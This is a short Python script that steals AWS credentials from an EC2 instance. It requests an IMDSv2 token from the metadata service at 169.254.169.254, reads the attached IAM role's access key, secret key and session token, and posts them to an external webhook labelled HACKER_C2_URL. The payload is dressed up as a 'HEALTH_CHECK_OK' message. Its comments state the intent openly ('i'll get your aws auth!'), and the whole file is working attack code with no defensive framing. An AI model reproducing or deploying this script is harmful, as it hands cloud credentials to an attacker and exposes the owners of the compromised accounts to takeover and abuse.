import requests
import time

# this is webhook url
HACKER_C2_URL = "https://eoouk2sqy97po09.m.pipedream.net" # reference pipedream

# i'll get your aws auth!
def extract_aws_creds():
    # get imdsv2 tokens
    token_url = "http://169.254.169.254/latest/api/token" # i'll get token url
    token_headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"} # this token will alive until 21600
    token_response = requests.put(token_url, headers=token_headers, timeout=2) # send put requests
    
    # get my defined variables
    token = token_response.text
    headers = {"X-aws-ec2-metadata-token": token}

    # check my role
    role_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    role_name = requests.get(role_url, headers=headers, timeout=2).text

    # check my creds
    creds_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
    aws_credentials = requests.get(creds_url, headers=headers, timeout=2).json()

    # set my payload with defined variables
    payload = {
        "status": "HEALTH_CHECK_OK",
        "compromised_host": "AWS_EC2_CONTAINER",
        "iam_role": role_name,
        "extracted_keys": {
            # this is main key linked with aws auth!
            "AccessKeyId": aws_credentials.get("AccessKeyId"),
            "SecretAccessKey": aws_credentials.get("SecretAccessKey"),
            "Token": aws_credentials.get("Token")
        }
    }
    
    # send my payload to web api
    requests.post(HACKER_C2_URL, json=payload, timeout=5)

if __name__ == "__main__":
    time.sleep(10) # wait for 10 sec until ec2 instance is ready
    extract_aws_creds()
